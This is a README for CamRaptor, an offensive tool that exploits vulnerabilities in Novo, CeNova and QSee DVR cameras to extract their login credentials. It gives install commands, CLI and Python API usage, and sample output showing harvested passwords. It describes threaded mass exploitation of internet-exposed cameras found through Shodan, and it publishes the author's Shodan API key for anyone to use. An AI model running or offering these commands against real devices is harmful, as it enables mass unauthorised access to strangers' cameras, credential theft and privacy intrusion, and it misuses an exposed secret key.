# CamRaptor

CamRaptor is a tool that exploits several vulnerabilities in popular DVR cameras to obtain camera credentials.

## Features

* Exploits vulnerabilities in most popular camera models such as `Novo`, `CeNova` and `QSee`.
* Optimized to exploit multiple cameras at one time from list with threading enabled.
* Simple CLI and API usage.

## Installation

```shell
pip3 install git+https://github.com/EntySec/CamRaptor
```

## Basic usage

To use CamRaptor just type `camraptor` in your terminal.

```
usage: camraptor [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--api API]

CamRaptor is a tool that exploits several vulnerabilities in popular DVR
cameras to obtain camera credentials.

optional arguments:
  -h, --help            show this help message and exit
  -t, --threads         Use threads for fastest work.
  -o OUTPUT, --output OUTPUT
                        Output result to file.
  -i INPUT, --input INPUT
                        Input file of addresses.
  -a ADDRESS, --address ADDRESS
                        Single address.
  --api API             Shodan API key for exploiting devices over Internet.
```

### Examples

Let's hack my camera just for fun.

```shell
camraptor -a 192.168.99.100
```

**output:**

```shell
[*] (192.168.99.100) - connecting to camera...
[*] (192.168.99.100) - accessing camera config...
[*] (192.168.99.100) - extracting camera credentials...
[i] (192.168.99.100) - admin:mamahacker123
```

Let's try to use Shodan search engine to exploit cameras over Internet and save all obtained passwords to `passwords.txt`, we will use it with `-t` for fast exploitation.

```shell
camraptor -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD -o passwords.txt
```

**NOTE:** Given Shodan API key (`PSKINdQe1GyxGgecYz2191H2JoS9qvgD`) is my PRO API key, you can use this key or your own, be free to use all our resources for free :)

**output:**

```shell
[*] Authorizing Shodan by given API key...
[+] Authorization successfully completed!
[*] Initializing thread #0...
[*] (x.x.x.x) - connecting to camera...
[*] Initializing thread #1...
[*] (x.x.x.x) - connecting to camera...
[*] Initializing thread #2...
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting camera credentials...
[i] Thread #0 completed.
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting camera credentials...
[i] Thread #1 completed.
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting camera credentials...
[i] Thread #2 completed.
```

Let's try to use opened database of cameras with `-t` for fast exploitation.

```shell
camraptor -t -i cameras.txt -o passwords.txt
```

**NOTE:** It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.

**output:**

```shell
[*] Initializing thread #0...
[*] (x.x.x.x) - connecting to camera...
[*] Initializing thread #1...
[*] (x.x.x.x) - connecting to camera...
[*] Initializing thread #2...
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting camera credentials...
[i] Thread #0 completed.
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting camera credentials...
[i] Thread #1 completed.
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting camera credentials...
[i] Thread #2 completed.
```

## CamRaptor API

CamRaptor also has their own Python API that can be invoked by importing CamRaptor to your code:

```python
from camraptor import CamRaptor
```

### Basic functions

There are all CamRaptor basic functions that can be used to exploit specified camera.

* `connect(host)` - Connect specified camera by network address.
* `exploit(camera)` - Exploit connected camera.

### Examples

```python
from camraptor import CamRaptor

camraptor = CamRaptor()

camera = camraptor.connect('192.168.99.100')
print(camraptor.exploit(camera))
```

**output:**

```shell
'mamahacker123'
```

## Other tools

<p>
    <a href="https://github.com/EntySec/Ghost">
        <img src="https://img.shields.io/badge/EntySec-%20Ghost-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/HatVenom">
        <img src="https://img.shields.io/badge/EntySec-%20HatVenom-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/Shreder">
        <img src="https://img.shields.io/badge/EntySec-%20Shreder-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/HatSploit">
        <img src="https://img.shields.io/badge/EntySec-%20HatSploit-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/CamOver">
        <img src="https://img.shields.io/badge/EntySec-%20CamOver-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/RomBuster">
        <img src="https://img.shields.io/badge/EntySec-%20RomBuster-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/membrane">
        <img src="https://img.shields.io/badge/EntySec-%20membrane-f34c79.svg">
    </a>
    <a href="https://github.com/EntySec/pwny">
        <img src="https://img.shields.io/badge/EntySec-%20pwny-448eff.svg">
    </a>
</p>
